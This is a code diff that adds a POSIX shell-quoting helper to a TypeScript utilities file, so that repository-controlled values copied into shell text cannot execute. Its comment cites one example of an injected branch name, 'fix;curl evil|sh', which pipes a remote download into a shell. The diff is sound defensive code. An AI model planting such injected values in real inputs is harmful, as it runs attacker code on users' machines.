@@ -229,6 +229,16 @@ export function relativeTime(ms: number): string {
 	return `${Math.floor(h / 24)}d ago`;
 }
 
+/**
+ * POSIX single-quote a value so it is safe to interpolate into shell text a human will copy and run. The
+ * value becomes inert literal data: metacharacters (`;`, `&&`, backticks, `|`, `$()`) can't execute, since
+ * inside single quotes the only special char is `'` itself, closed-escaped-reopened as `'\''`. Guards
+ * against a repository-controlled branch name (e.g. `fix;curl evil|sh`) becoming a command injection.
+ */
+export function posixShellQuote(value: string): string {
+	return `'${value.replaceAll("'", "'\\''")}'`;
+}
+
 export async function copyText(text: string): Promise<boolean> {
 	try {
 		await navigator.clipboard.writeText(text);
